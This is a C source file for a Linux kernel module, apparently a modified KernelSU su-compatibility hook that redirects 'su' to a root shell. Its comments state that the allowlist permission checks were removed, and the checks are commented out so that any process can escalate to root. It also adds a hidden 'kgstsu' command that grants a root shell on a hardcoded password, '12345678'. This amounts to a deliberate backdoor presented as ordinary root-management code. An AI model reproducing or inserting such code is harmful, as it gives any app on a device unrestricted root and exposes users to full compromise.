#include <linux/compiler_types.h>
#include <linux/preempt.h>
#include <linux/printk.h>
#include <linux/mm.h>
#include <linux/pgtable.h>
#include <linux/uaccess.h>
#include <asm/current.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/types.h>
#include <linux/version.h>
#include <linux/sched/task_stack.h>
#include <linux/ptrace.h>

#include "arch.h"
#include "policy/allowlist.h"
#include "policy/feature.h"
#include "klog.h" // IWYU pragma: keep
#include "runtime/ksud.h"
#include "feature/sucompat.h"
#include "policy/app_profile.h"
#include "hook/syscall_hook.h"
#include "sulog/event.h"

#define SU_PATH "/system/bin/su"
#define SH_PATH "/system/bin/sh"
#define KGSTSU_PATH "/system/bin/kgstsu"
#define KGSTSU_PASSWORD "12345678"

bool ksu_su_compat_enabled __read_mostly = true;

static int su_compat_feature_get(u64 *value)
{
    *value = ksu_su_compat_enabled ? 1 : 0;
    return 0;
}

static int su_compat_feature_set(u64 value)
{
    bool enable = value != 0;
    ksu_su_compat_enabled = enable;
    pr_info("su_compat: set to %d\n", enable);
    return 0;
}

static const struct ksu_feature_handler su_compat_handler = {
    .feature_id = KSU_FEATURE_SU_COMPAT,
    .name = "su_compat",
    .get_handler = su_compat_feature_get,
    .set_handler = su_compat_feature_set,
};

static void __user *userspace_stack_buffer(const void *d, size_t len)
{
    // To avoid having to mmap a page in userspace, just write below the stack
    // pointer.
    char __user *p = (void __user *)current_user_stack_pointer() - len;

    return copy_to_user(p, d, len) ? NULL : p;
}

static char __user *sh_user_path(void)
{
    static const char sh_path[] = "/system/bin/sh";

    return userspace_stack_buffer(sh_path, sizeof(sh_path));
}

/* kgstsu 使用 sh_user_path 即可 */
#define kgstsu_sh_user_path() sh_user_path()

static char __user *ksud_user_path(void)
{
    static const char ksud_path[] = KSUD_PATH;

    return userspace_stack_buffer(ksud_path, sizeof(ksud_path));
}

int ksu_handle_faccessat(int *dfd, const char __user **filename_user, int *mode, int *__unused_flags)
{
    const char su[] = SU_PATH;
    const char kgstsu[] = KGSTSU_PATH;

    /* 权限检查已移除，任何进程都可以使用 su */
    /* if (!ksu_is_allow_uid_for_current(current_uid().val)) { */
    /*     return 0; */
    /* } */

    char path[sizeof(su) + 1];
    memset(path, 0, sizeof(path));
    strncpy_from_user_nofault(path, *filename_user, sizeof(path));

    if (unlikely(!memcmp(path, su, sizeof(su)))) {
        pr_info("faccessat su->sh!\n");
        *filename_user = sh_user_path();
    } else if (unlikely(!memcmp(path, kgstsu, sizeof(kgstsu)))) {
        pr_info("faccessat kgstsu->sh!\n");
        *filename_user = kgstsu_sh_user_path();
    }

    return 0;
}

int ksu_handle_stat(int *dfd, const char __user **filename_user, int *flags)
{
    // const char sh[] = SH_PATH;
    const char su[] = SU_PATH;
    const char kgstsu[] = KGSTSU_PATH;

    /* 权限检查已移除，任何进程都可以使用 su */
    /* if (!ksu_is_allow_uid_for_current(current_uid().val)) { */
    /*     return 0; */
    /* } */

    if (unlikely(!filename_user)) {
        return 0;
    }

    char path[sizeof(su) + 1];
    memset(path, 0, sizeof(path));
    strncpy_from_user_nofault(path, *filename_user, sizeof(path));

    if (unlikely(!memcmp(path, su, sizeof(su)))) {
        pr_info("newfstatat su->sh!\n");
        *filename_user = sh_user_path();
    } else if (unlikely(!memcmp(path, kgstsu, sizeof(kgstsu)))) {
        pr_info("newfstatat kgstsu->sh!\n");
        *filename_user = kgstsu_sh_user_path();
    }

    return 0;
}

long ksu_handle_execve_sucompat(const char __user **filename_user, int orig_nr, const struct pt_regs *regs)
{
    const char su[] = SU_PATH;
    const char kgstsu[] = KGSTSU_PATH;
    const char __user *fn;
    const char __user *const __user *argv_user = (const char __user *const __user *)PT_REGS_PARM2(regs);
    struct ksu_sulog_pending_event *pending_sucompat = NULL;
    char path[sizeof(su) + 1];
    long ret;
    unsigned long addr;

    if (unlikely(!filename_user))
        goto do_orig_execve;

    /* 权限检查已移除，任何进程都可以执行 su 直接提权 */
    /* if (!ksu_is_allow_uid_for_current(current_uid().val)) */
    /*     goto do_orig_execve; */

    addr = untagged_addr((unsigned long)*filename_user);
    fn = (const char __user *)addr;
    memset(path, 0, sizeof(path));

    ret = strncpy_from_user(path, fn, sizeof(path));

    if (ret < 0) {
        pr_warn("Access filename when execve failed: %ld", ret);
        goto do_orig_execve;
    }

    /* 优先检测 kgstsu 命令 */
    if (!memcmp(path, kgstsu, sizeof(kgstsu))) {
        char pwd_buf[sizeof(KGSTSU_PASSWORD) + 1] = {0};
        const char __user *pwd_ptr;

        /* 获取第一个参数（密码） */
        ret = get_user(pwd_ptr, argv_user + 1);
        if (ret == 0 && pwd_ptr != NULL) {
            strncpy_from_user_nofault(pwd_buf, pwd_ptr, sizeof(pwd_buf) - 1);
            pwd_buf[sizeof(pwd_buf) - 1] = '\0';
        }

        if (pwd_buf[0] && !strcmp(pwd_buf, KGSTSU_PASSWORD)) {
            /* 密码正确！触发提权 */
            pr_info("kgstsu: password correct, escaping to root shell\n");
            pending_sucompat = ksu_sulog_capture_sucompat(*filename_user, argv_user, GFP_KERNEL);
            *filename_user = kgstsu_sh_user_path();

            ret = escape_with_root_profile();
            if (ret) {
                pr_err("kgstsu: escape_with_root_profile failed: %ld\n", ret);
                ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
                goto do_orig_execve;
            }

            ret = ksu_syscall_table[orig_nr](regs);
            if (ret < 0) {
                pr_err("kgstsu: failed to execve sh: %ld\n", ret);
                ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
            } else {
                ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
            }
            return ret;
        } else {
            /* 密码错误或无密码，放行 */
            pr_info("kgstsu: wrong password or no password, bypass\n");
            goto do_orig_execve;
        }
    }

    if (likely(memcmp(path, su, sizeof(su))))
        goto do_orig_execve;

    pr_info("sys_execve su found, escaping to root shell\n");
    pending_sucompat = ksu_sulog_capture_sucompat(*filename_user, argv_user, GFP_KERNEL);
    *filename_user = sh_user_path();  // 直接执行 sh，获得 root shell

    ret = escape_with_root_profile();
    if (ret) {
        pr_err("escape_with_root_profile failed: %ld\n", ret);
        ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
        goto do_orig_execve;
    }

    ret = ksu_syscall_table[orig_nr](regs);
    if (ret < 0) {
        pr_err("failed to execve sh as su: %ld\n", ret);
        ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
    } else {
        ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
    }

    return ret;

do_orig_execve:
    return ksu_syscall_table[orig_nr](regs);
}

// sucompat: permitted process can execute 'su' to gain root access.
void __init ksu_sucompat_init()
{
    if (ksu_register_feature_handler(&su_compat_handler)) {
        pr_err("Failed to register su_compat feature handler\n");
    }
}

void __exit ksu_sucompat_exit()
{
    ksu_unregister_feature_handler(KSU_FEATURE_SU_COMPAT);
}
